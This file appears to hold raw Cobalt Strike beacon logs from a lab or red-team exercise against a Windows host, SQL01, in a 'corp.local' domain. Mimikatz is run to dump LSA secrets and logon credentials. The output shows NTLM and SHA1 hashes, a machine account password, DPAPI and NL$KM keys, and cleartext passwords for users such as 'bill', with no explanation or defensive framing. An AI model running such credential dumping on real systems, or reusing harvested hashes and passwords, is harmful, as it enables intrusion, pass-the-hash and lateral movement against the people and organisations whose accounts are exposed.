# Mimikatz secrets
```powershell
[12/21 12:52:44] beacon> mimikatz !lsadump::secrets
[12/21 12:52:46] [*] Tasked beacon to run mimikatz's !lsadump::secrets command
[12/21 12:52:46] [+] host called home, sent: 815428 bytes
[12/21 12:52:48] [+] received output:
Domain : SQL01
SysKey : c71ab2caf5e3be67bd9f1d7fe11f5582

Local name : SQL01 ( S-1-5-21-3721809910-3745490168-3868797961 )
Domain name : CORP ( S-1-5-21-2291914956-3290296217-2402366952 )
Domain FQDN : corp.local

Policy subsystem is : 1.14
LSA Key(s) : 1, default {3ca464ad-33dc-d9bc-b144-fd15beb99759}
  [00] {3ca464ad-33dc-d9bc-b144-fd15beb99759} 51b5000a2aa699099be1ed98ff3d32ff9744357098a687d26b12c446f7abeafa

Secret  : $MACHINE.ACC
cur/text: `\Zqw(<K!xPD'EYp7pU:7%o/jsklO1v*<u,a+b)\kyh?2Vs(5XV/eu\Km;5MNxUw!k@I-mQa$.Q.o<80XA4N7#rX4+Tj\v-MhKM453zBa$G0*oq-W8yD=Pna
    NTLM:b40dae2bd88b86bf78ea95ba80f95f33
    SHA1:b3251c1ffe7ed34407c29fc38ee1c91eba155694
old/text: `\Zqw(<K!xPD'EYp7pU:7%o/jsklO1v*<u,a+b)\kyh?2Vs(5XV/eu\Km;5MNxUw!k@I-mQa$.Q.o<80XA4N7#rX4+Tj\v-MhKM453zBa$G0*oq-W8yD=Pna
    NTLM:b40dae2bd88b86bf78ea95ba80f95f33
    SHA1:b3251c1ffe7ed34407c29fc38ee1c91eba155694
 
Secret  : DefaultPassword
old/text: Carrot dog fish cat tree frog1!

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 80 f9 65 9a 3f ac d5 d4 01 27 26 3f c1 3e 68 76 96 46 cf 9b e4 06 51 03 3f fe 23 7b a5 48 e9 f2 e2 a8 30 65 dd ff 17 6d 
    full: 80f9659a3facd5d40127263fc13e68769646cf9be40651033ffe237ba548e9f2e2a83065ddff176d
    m/u : 80f9659a3facd5d40127263fc13e68769646cf9b / e40651033ffe237ba548e9f2e2a83065ddff176d
old/hex : 01 00 00 00 21 f1 eb eb d4 63 77 79 e0 11 39 5f e0 e8 06 a3 51 43 a5 d6 58 29 05 14 3d 52 e5 65 a1 67 04 a9 14 91 fc 47 0d 1a 96 90 
    full: 21f1ebebd4637779e011395fe0e806a35143a5d6582905143d52e565a16704a91491fc470d1a9690
    m/u : 21f1ebebd4637779e011395fe0e806a35143a5d6 / 582905143d52e565a16704a91491fc470d1a9690

Secret  : NL$KM
cur/hex : 99 4f 5d 6c 55 b9 ec b5 0c 0b d8 75 a2 88 93 e4 c0 d9 ef c5 0d b9 40 57 92 39 9a be 9d a5 83 ed 11 cb 71 7c ab 32 cd 11 fd 7a ed 2e ab be f1 62 58 f2 1d 8a ac 9f ac fb 32 17 d8 ee b3 bd a5 dc 
old/hex : 99 4f 5d 6c 55 b9 ec b5 0c 0b d8 75 a2 88 93 e4 c0 d9 ef c5 0d b9 40 57 92 39 9a be 9d a5 83 ed 11 cb 71 7c ab 32 cd 11 fd 7a ed 2e ab be f1 62 58 f2 1d 8a ac 9f ac fb 32 17 d8 ee b3 bd a5 dc 

Secret  : _SC_MSSQL$SQLEXPRESS / service 'MSSQL$SQLEXPRESS' with username : NT Service\MSSQL$SQLEXPRESS
```

# Mimikatz logonpasswords

```powershell
12/21 12:53:58] beacon> logonpasswords
[12/21 12:53:59] [*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
[12/21 12:53:59] [+] host called home, sent: 314699 bytes
[12/21 12:54:00] [+] received output:

Authentication Id : 0 ; 53293 (00000000:0000d02d)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/18/2023 6:01:43 PM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : SQL01$
	 * Domain   : CORP
	 * NTLM     : b40dae2bd88b86bf78ea95ba80f95f33
	 * SHA1     : b3251c1ffe7ed34407c29fc38ee1c91eba155694
	tspkg :	
	wdigest :	
	 * Username : SQL01$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : SQL01$
	 * Domain   : corp.local
	 * Password : `\Zqw(<K!xPD'EYp7pU:7%o/jsklO1v*<u,a+b)\kyh?2Vs(5XV/eu\Km;5MNxUw!k@I-mQa$.Q.o<80XA4N7#rX4+Tj\v-MhKM453zBa$G0*oq-W8yD=Pna
	ssp :	
	credman :	

Authentication Id : 0 ; 24564692 (00000000:0176d3d4)
Session           : Batch from 0
User Name         : justalocaladmin
Domain            : SQL01
Logon Server      : SQL01
Logon Time        : 12/21/2023 11:17:05 AM
SID               : S-1-5-21-3721809910-3745490168-3868797961-1002
	msv :	
	 [00000003] Primary
	 * Username : justalocaladmin
	 * Domain   : SQL01
	 * NTLM     : ff15e56f22ba7bf54c255e1c9f3bef9d
	 * SHA1     : 55eef2ab63c7bba3044ddda78e93feb9856d4dfb
	tspkg :	
	wdigest :	
	 * Username : justalocaladmin
	 * Domain   : SQL01
	 * Password : (null)
	kerberos :	
	 * Username : justalocaladmin
	 * Domain   : SQL01
	 * Password : (null)
	ssp :	
	 [00000000]
	 * Username : bill
	 * Domain   : CORP
	 * Password : I like to map Shares!
	credman :	

Authentication Id : 0 ; 242130 (00000000:0003b1d2)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/18/2023 6:01:57 PM
SID               : S-1-5-90-0-2
	msv :	
	 [00000003] Primary
	 * Username : SQL01$
	 * Domain   : CORP
	 * NTLM     : b40dae2bd88b86bf78ea95ba80f95f33
	 * SHA1     : b3251c1ffe7ed34407c29fc38ee1c91eba155694
	tspkg :	
	wdigest :	
	 * Username : SQL01$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : SQL01$
	 * Domain   : corp.local
	 * Password : `\Zqw(<K!xPD'EYp7pU:7%o/jsklO1v*<u,a+b)\kyh?2Vs(5XV/eu\Km;5MNxUw!k@I-mQa$.Q.o<80XA4N7#rX4+Tj\v-MhKM453zBa$G0*oq-W8yD=Pna
	ssp :	
	credman :	

Authentication Id : 0 ; 242114 (00000000:0003b1c2)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/18/2023 6:01:57 PM
SID               : S-1-5-90-0-2
	msv :	
	 [00000003] Primary
	 * Username : SQL01$
	 * Domain   : CORP
	 * NTLM     : b40dae2bd88b86bf78ea95ba80f95f33
	 * SHA1     : b3251c1ffe7ed34407c29fc38ee1c91eba155694
	tspkg :	
	wdigest :	
	 * Username : SQL01$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : SQL01$
	 * Domain   : corp.local
	 * Password : `\Zqw(<K!xPD'EYp7pU:7%o/jsklO1v*<u,a+b)\kyh?2Vs(5XV/eu\Km;5MNxUw!k@I-mQa$.Q.o<80XA4N7#rX4+Tj\v-MhKM453zBa$G0*oq-W8yD=Pna
	ssp :	
	credman :	

Authentication Id : 0 ; 94046 (00000000:00016f5e)
Session           : Service from 0
User Name         : MSSQL$SQLEXPRESS
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 12/18/2023 6:01:44 PM
SID               : S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133
	msv :	
	 [00000003] Primary
	 * Username : SQL01$
	 * Domain   : CORP
	 * NTLM     : b40dae2bd88b86bf78ea95ba80f95f33
	 * SHA1     : b3251c1ffe7ed34407c29fc38ee1c91eba155694
	tspkg :	
	wdigest :	
	 * Username : SQL01$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : SQL01$
	 * Domain   : CORP.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : SQL01$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 12/18/2023 6:01:43 PM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : SQL01$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : sql01$
	 * Domain   : CORP.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 23627527 (00000000:01688707)
Session           : Batch from 0
User Name         : justalocaladmin
Domain            : SQL01
Logon Server      : SQL01
Logon Time        : 12/21/2023 8:42:42 AM
SID               : S-1-5-21-3721809910-3745490168-3868797961-1002
	msv :	
	 [00000003] Primary
	 * Username : justalocaladmin
	 * Domain   : SQL01
	 * NTLM     : ff15e56f22ba7bf54c255e1c9f3bef9d
	 * SHA1     : 55eef2ab63c7bba3044ddda78e93feb9856d4dfb
	tspkg :	
	wdigest :	
	 * Username : justalocaladmin
	 * Domain   : SQL01
	 * Password : (null)
	kerberos :	
	 * Username : justalocaladmin
	 * Domain   : SQL01
	 * Password : (null)
	ssp :	
	 [00000000]
	 * Username : bill
	 * Domain   : CORP
	 * Password : I like to map Shares!
	credman :	

Authentication Id : 0 ; 343011 (00000000:00053be3)
Session           : RemoteInteractive from 2
User Name         : Hax0r
Domain            : SQL01
Logon Server      : SQL01
Logon Time        : 12/18/2023 6:02:09 PM
SID               : S-1-5-21-3721809910-3745490168-3868797961-1004
	msv :	
	 [00000003] Primary
	 * Username : Hax0r
	 * Domain   : SQL01
	 * NTLM     : 7177edb660b734e41a029700f80d0244
	 * SHA1     : 44ef154bfbb609b3f3d096d62165eaded500dbf1
	tspkg :	
	wdigest :	
	 * Username : Hax0r
	 * Domain   : SQL01
	 * Password : (null)
	kerberos :	
	 * Username : Hax0r
	 * Domain   : SQL01
	 * Password : (null)
	ssp :	
	 [00000000]
	 * Username : bill
	 * Domain   : CORP
	 * Password : I like to map Shares!
	credman :	

Authentication Id : 0 ; 342971 (00000000:00053bbb)
Session           : RemoteInteractive from 2
User Name         : Hax0r
Domain            : SQL01
Logon Server      : SQL01
Logon Time        : 12/18/2023 6:02:09 PM
SID               : S-1-5-21-3721809910-3745490168-3868797961-1004
	msv :	
	 [00000003] Primary
	 * Username : Hax0r
	 * Domain   : SQL01
	 * NTLM     : 7177edb660b734e41a029700f80d0244
	 * SHA1     : 44ef154bfbb609b3f3d096d62165eaded500dbf1
	tspkg :	
	wdigest :	
	 * Username : Hax0r
	 * Domain   : SQL01
	 * Password : (null)
	kerberos :	
	 * Username : Hax0r
	 * Domain   : SQL01
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : SQL01$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 12/18/2023 6:01:43 PM
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : SQL01$
	 * Domain   : CORP
	 * NTLM     : b40dae2bd88b86bf78ea95ba80f95f33
	 * SHA1     : b3251c1ffe7ed34407c29fc38ee1c91eba155694
	tspkg :	
	wdigest :	
	 * Username : SQL01$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : sql01$
	 * Domain   : CORP.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 31987 (00000000:00007cf3)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 12/18/2023 6:01:43 PM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : SQL01$
	 * Domain   : CORP
	 * NTLM     : b40dae2bd88b86bf78ea95ba80f95f33
	 * SHA1     : b3251c1ffe7ed34407c29fc38ee1c91eba155694
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	 [00000000]
	 * Username : bill
	 * Domain   : CORP
	 * Password : I like to map Shares!
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 12/18/2023 6:01:43 PM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 53256 (00000000:0000d008)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/18/2023 6:01:43 PM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : SQL01$
	 * Domain   : CORP
	 * NTLM     : b40dae2bd88b86bf78ea95ba80f95f33
	 * SHA1     : b3251c1ffe7ed34407c29fc38ee1c91eba155694
	tspkg :	
	wdigest :	
	 * Username : SQL01$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : SQL01$
	 * Domain   : corp.local
	 * Password : `\Zqw(<K!xPD'EYp7pU:7%o/jsklO1v*<u,a+b)\kyh?2Vs(5XV/eu\Km;5MNxUw!k@I-mQa$.Q.o<80XA4N7#rX4+Tj\v-MhKM453zBa$G0*oq-W8yD=Pna
	ssp :	
	credman :	

```